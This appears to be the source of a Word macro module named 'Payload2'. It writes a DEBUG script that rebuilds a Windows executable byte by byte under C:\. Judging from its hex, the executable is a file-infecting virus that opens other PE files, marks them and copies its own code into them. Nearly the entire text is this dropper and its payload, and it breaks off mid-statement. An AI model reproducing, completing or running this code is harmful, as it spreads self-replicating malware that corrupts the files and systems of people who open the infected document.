Attribute VB_Name = "Payload2"

Public Sub MAIN()
Dim T$
T$ = Chr(13) + Chr(10)
WordBasic.Insert "Open " + Chr(34) + "C:\myscript.scr" + Chr(34) + _
" For Output As #1" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"n c:\myscript.exe" + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0200 50 45 00 00 4c 01 04 00 8d 25 b3 49 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0210 00 00 00 00 e0 00 8e 81 0b 01 02 19 00 12 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0220 00 06 00 00 00 00 00 00 00 10 00 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0230 00 30 00 00 00 00 40 00 00 10 00 00 00 02 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0250 00 60 00 00 00 04 00 00 00 00 00 00 02 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0280 00 40 00 00 ac 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02a0 00 50 00 00 78 01 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02f0 00 00 00 00 00 00 00 00 43 4f 44 45 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0300 00 20 00 00 00 10 00 00 00 12 00 00 00 06 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 e0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0330 00 02 00 00 00 18 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0340 00 00 00 00 40 00 00 c0 2e 69 64 61 74 61 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0350 00 10 00 00 00 40 00 00 00 02 00 00 00 1a 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0370 2e 72 65 6c 6f 63 00 00 00 10 00 00 00 50 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0380 00 02 00 00 00 1c 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0390 00 00 00 00 40 00 00 50 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0700 55 e8 00 00 00 00 5d 8b dd 81 ed 06 10 40 00 b8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0710 00 10 00 00 83 c0 06 2b d8 89 9d d4 18 40 00 ba " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0720 8d 1b 40 00 03 d5 8b 8d 89 1b 40 00 55 e8 14 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0730 00 00 5d 83 f8 ff 74 5c 89 85 9e 1b 40 00 55 bb " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0740 7c 1b 40 00 03 dd 53 ff d0 5d 89 85 d0 18 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0750 bf 89 1b 40 00 03 fd 8b 0f 81 f9 41 59 41 4d 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0760 15 83 c7 04 8b d7 03 f9 57 e8 35 00 00 00 5f 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0770 07 83 c7 04 eb e1 c7 85 38 1b 40 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0780 e8 f1 05 00 00 e8 8f 05 00 00 e8 96 04 00 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0790 6f 06 00 00 8b 85 6c 1b 40 00 03 85 d4 18 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07a0 5d 50 c3 8b b5 d0 18 40 00 66 81 3e 4d 5a 0f 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07b0 8c 00 00 00 33 c0 66 8b 46 3c 03 85 d0 18 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07c0 96 66 81 3e 50 45 75 78 8b 76 78 03 b5 d0 18 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07d0 00 8b 46 1c 03 85 d0 18 40 00 89 85 3c 1b 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07e0 8b 46 20 03 85 d0 18 40 00 89 85 40 1b 40 00 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07f0 46 24 03 85 d0 18 40 00 89 85 44 1b 40 00 33 c0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0800 51 8b f2 8b bd 40 1b 40 00 03 f8 8b 3f 03 bd d0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0810 18 40 00 f3 a6 83 f9 00 74 06 83 c0 04 59 eb e0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0820 59 d1 e8 03 85 44 1b 40 00 33 db 66 8b 18 c1 e3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0830 02 03 9d 3c 1b 40 00 8b 03 03 85 d0 18 40 00 c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0840 b8 ff ff ff ff c3 8b b5 d4 18 40 00 66 81 3e 4d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0850 5a 0f 85 96 00 00 00 33 c0 66 8b 46 3c 8b f0 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0860 b5 d4 18 40 00 66 81 3e 50 45 0f 85 7d 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0870 8b b6 80 00 00 00 03 b5 d4 18 40 00 8b c6 8b f0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0880 8b 76 0c 03 b5 d4 18 40 00 81 3e 4b 45 52 4e 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0890 05 83 c0 14 eb e8 8b f0 8b 46 10 03 85 d4 18 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08a0 00 89 85 48 1b 40 00 83 3e 00 74 41 8b 36 03 b5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08b0 d4 18 40 00 8b de 33 c0 83 3b 00 74 30 80 7b 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08c0 80 74 16 8b 33 03 b5 d4 18 40 00 83 c6 02 8b fa " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08d0 51 f3 a6 83 f9 00 59 74 06 40 83 c3 04 eb d9 c1 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08e0 e0 02 03 85 48 1b 40 00 8b d8 8b 00 c3 b8 ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08f0 ff ff c3 c7 85 34 1b 40 00 00 00 00 00 e8 ae 02 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0900 00 00 89 85 30 1b 40 00 52 b8 80 00 00 00 e8 ab " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0910 02 00 00 5a 52 e8 07 02 00 00 83 f8 ff 0f 84 f1 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0920 01 00 00 89 85 54 1b 40 00 e8 6e 02 00 00 83 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0930 ff 0f 84 d2 01 00 00 83 bd 4c 1b 40 00 00 0f 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0940 c5 01 00 00 91 89 8d 50 1b 40 00 8b 85 54 1b 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0950 00 8b 8d 50 1b 40 00 81 c1 11 20 00 00 e8 e9 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0960 00 00 83 f8 00 0f 84 72 01 00 00 89 85 58 1b 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0970 00 8b 8d 50 1b 40 00 81 c1 11 20 00 00 e8 de 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0980 00 00 83 f8 00 0f 84 52 01 00 00 89 85 5c 1b 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0990 00 8b f0 66 81 3e 4d 5a 0f 85 34 01 00 00 66 81 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09a0 7e 12 57 4d 0f 84 28 01 00 00 66 c7 46 12 57 4d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09b0 33 c0 66 8b 46 3c 66 3d 00 00 0f 84 12 01 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09c0 3b 05 50 1b 40 00 0f 83 06 01 00 00 03 85 5c 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09d0 40 00 8b f0 66 81 3e 50 45 0f 85 f3 00 00 00 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09e0 85 60 1b 40 00 8b 46 3c 89 85 68 1b 40 00 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09f0 6c 1b 40 00 89 85 74 1b 40 00 8b 46 28 89 85 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a00 1b 40 00 33 c0 66 8b 46 06 48 66 b9 28 00 66 f7 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a10 e1 8b 5e 74 c1 e3 03 03 c3 83 c0 78 03 85 60 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a20 40 00 89 85 64 1b 40 00 8b f8 8b 47 10 89 85 78 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a30 1b 40 00 03 47 0c 89 85 10 10 40 00 89 85 70 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a40 40 00 57 8b 47 14 03 85 5c 1b 40 00 03 47 10 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a50 f8 be 00 10 40 00 03 f5 b9 11 10 00 00 fc f3 a4 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a60 5f 81 47 10 11 10 00 00 81 85 50 1b 40 00 11 10 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a70 00 00 33 d2 8b 47 10 8b 8d 68 1b 40 00 51 f7 f1 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a80 59 2b ca 01 4f 10 01 8d 50 1b 40 00 8b 47 10 89 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a90 47 08 83 4f 24 20 81 4f 24 00 00 00 20 81 4f 24 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0aa0 00 00 00 80 8b b5 60 1b 40 00 8b 85 70 1b 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ab0 89 46 28 8b 47 0c 03 47 10 89 46 50 8b 85 74 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ac0 40 00 89 85 6c 1b 40 00 c7 85 34 1b 40 00 01 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ad0 00 00 8b 85 5c 1b 40 00 e8 96 00 00 00 8b 85 58 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ae0 1b 40 00 e8 57 00 00 00 8b 85 54 1b 40 00 8b 8d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0af0 50 1b 40 00 e8 86 00 00 00 83 f8 ff 74 0b 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b00 54 1b 40 00 e8 87 00 00 00 8b 85 54 1b 40 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b10 2b 00 00 00 5a 8b 85 30 1b 40 00 e8 9e 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b20 c3 55 6a 00 68 80 00 00 00 6a 03 6a 00 6a 01 68 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b30 00 00 00 c0 52 8b 85 c9 1b 40 00 ff d0 5d c3 55 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b40 50 8b 85 4c 1c 40 00 ff d0 5d c3 55 6a 00 51 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b50 00 6a 04 6a 00 50 8b 85 0a 1c 40 00 ff d0 5d c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b60 55 51 6a 00 6a 00 6a 02 50 8b 85 20 1c 40 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b70 d0 5d c3 55 50 8b 85 38 1c 40 00 ff d0 5d c3 55 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b80 6a 00 6a 00 51 50 8b 85 a2 1c 40 00 ff d0 5d c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b90 55 50 8b 85 b7 1c 40 00 ff d0 5d c3 55 bb 4c 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ba0 40 00 03 dd 53 50 8b 85 ef 1b 40 00 ff d0 5d c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bb0 55 52 52 8b 85 0c 1d 40 00 ff d0 5a 5d c3 55 50 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bc0 52 8b 85 27 1d 40 00 ff d0 5d c3 55 50 68 80 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bd0 00 00 8b 85 d4 1c 40 00 ff d0 5d c3 55 50 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0be0 f1 1c 40 00 ff d0 5d c3 55 68 80 00 00 00 50 8b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bf0 85 5a 1d 40 00 ff d0 5d c3 55 b8 d8 19 40 00 03 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c00 c5 50 8b 85 3d 1d 40 00 ff d0 5d c3 55 50 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c10 9e 1b 40 00 ff d0 5d c3 55 52 50 8b 85 b5 1b 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
